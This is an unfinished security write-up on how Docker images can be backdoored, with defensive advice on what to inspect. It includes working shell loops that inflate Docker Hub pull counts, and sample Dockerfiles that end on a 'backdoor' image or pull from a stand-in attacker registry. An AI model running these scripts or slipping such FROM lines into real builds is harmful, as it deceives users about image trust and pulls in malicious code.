# (WIP) Research on docker backdooring
Pantelis Roditis (09/07/2020)

For the past x years I've been developing docker containers that can be used in the right `wrong` way to emulate fully functional linux systemsm which is in stark contrast to how docker was meant to be used but anyways.

During this time I have come across a load of different types of suspicious docker containers from both docker hub and github projects.

Just like any other process of cybersecurity apply common logic when you are about to blindly trust an docker image, simply because it can be found on docker hub.

This following document includes research on what you shouldn't trust, the reason and hopefully an example of how it can be abused. This list is in no means complete, it is a documentation of what i look for when inspecting docker images from untrusted sources.


## Docker Hub stats
First and foremost don't trust stats provided by docker hub. The stars and pull requests can be easily manipulated to a huge degree.

If the image you're looking at has suspiciously high numbers of pulls and stars for its perceived reputation then something might be fishy.

In order to manipulate the pull numbers a malicious user could create an extremely small image, kilobytes in size and push it and then make pull requests to increase the number of pull requests. Some of the ways a bad actor can do that

**docker pull**

```sh
name="repo/image"
for i in $(seq 1 1000);do
  docker pull "${name}"
  docker rmi -f "${name}"
done
```


**ab (ApacheBenchmark)**
```sh
name="repo/image"
token=$( curl -s "https://auth.docker.io/token?service=registry.docker.io&scope=repository:${name}:pull" | jq -r .token )
ab -n 50 -c 10 -H "Authorization: Bearer $token" "https://registry.hub.docker.com/v2/${name}/manifests/latest"
```

**curl**
```sh
for i in $(seq 1 50);do
  token=$( curl -s "https://auth.docker.io/token?service=registry.docker.io&scope=repository:${name}:pull" | jq -r .token )
  curl -s -H "Authorization: Bearer $token" "https://registry.hub.docker.com/v2/${name}/manifests/latest" >/dev/null
done
```

## The FROM statement
Usually one of the top most statements of a `Dockerfile`.  It is used to instruct docker to use another image as a base. Any following commands within the `Dockerfile` will be executed as if they were run from within a container of the imported image.

Usual tricks that can be found in this section include but not limited to the following


### Multi-stage builds

A `Dockerfile` can have more than one `FROM` statements. Import from a legitimate image, perform some tasks to confuse user and import a malicious image last to be executed.

```Dockerfile
FROM debian
RUN apt-get install curl bash
...
FROM backdoor
```

Although the image started with `FROM debian` it will end up running whatever `FROM backdoor` image has.

### Image with registry part
One of the things that `docker` will do for you is to parse as URL the image name. This means that the following statement is valid
```sh
FROM badregistry.attacker.io:443/repo/backdoor
```

Upon building this image docker will connect to `badregistry.attacker.io:443` and attempt to fetch the image `repo/backdoor`


### Unicode `FROM` image

Pay close attention at the FROM image names as Unicode characters can be used to make it look like it came from a legit repository.

* [IDN homograph attack](https://en.wikipedia.org/wiki/IDN_homograph_attack)
* [Unicode Bidirectional Text Spoofing](http://unicode.org/reports/tr36/tr36-8.html#Bidirectional_Text_Spoofing)


## The RUN statement

## The COPY/ADD statement

## The VOLUME statement

## The CMD statement

## The ENTRYPOINT statement

## The entrypoint.sh script

## Package manager repos

## The docker run/create CLI params
Pay close attention at the docker parameters required to run the container. The parameters that usually make me suspicious are:
* `--privileged`
* `--cap_add`
## Refs
* https://www.fortinet.com/blog/threat-research/yet-another-crypto-mining-botnet
* https://kromtech.com/blog/security-center/cryptojacking-invades-cloud-how-modern-containerization-trend-is-exploited-by-attackers
